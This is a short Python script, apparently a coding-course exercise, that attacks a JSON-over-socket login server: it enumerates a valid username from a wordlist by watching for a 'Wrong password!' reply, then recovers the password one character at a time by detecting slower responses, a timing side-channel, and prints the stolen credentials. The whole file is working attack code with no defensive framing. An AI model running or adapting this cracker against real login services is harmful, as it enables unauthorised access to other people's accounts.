from socket import socket
from sys import argv
from os import getcwd, path
from json import dumps, loads
from string import ascii_lowercase, ascii_uppercase, digits
from time import time


class Cracker:
    pass_chars = *ascii_lowercase, *ascii_uppercase, *digits

    def __init__(self, address):
        self.s = socket()
        self.s.connect(address)

    def send(self, username, password):
        payload = {'login': username, 'password': password}
        self.s.send(dumps(payload).encode())

        start = time()
        res = loads(self.s.recv(1024).decode())
        end = time()
        duration = end - start

        return {'msg': res['result'], 'duration': duration}

    def crack_username(self):
        logins_filepath = path.join(getcwd(), 'hacking', 'logins.txt')
        for line in open(logins_filepath):
            username = line.strip()
            result = self.send(username, '')
            if result['msg'] == 'Wrong password!':
                return username

    def crack_password(self, username):
        guessed = ''
        while True:
            for char in Cracker.pass_chars:
                result = self.send(username, guessed + char)
                if result['duration'] >= 0.1:
                    guessed += char
                    break
                elif result['msg'] == 'Connection success!':
                    guessed += char
                    return guessed

    def crack(self):
        username = self.crack_username()
        password = self.crack_password(username)
        return {'login': username, 'password': password}


def main():
    address = argv[1], int(argv[2])
    cracker = Cracker(address)
    result = cracker.crack()
    print(dumps(result))


if __name__ == '__main__':
    main()
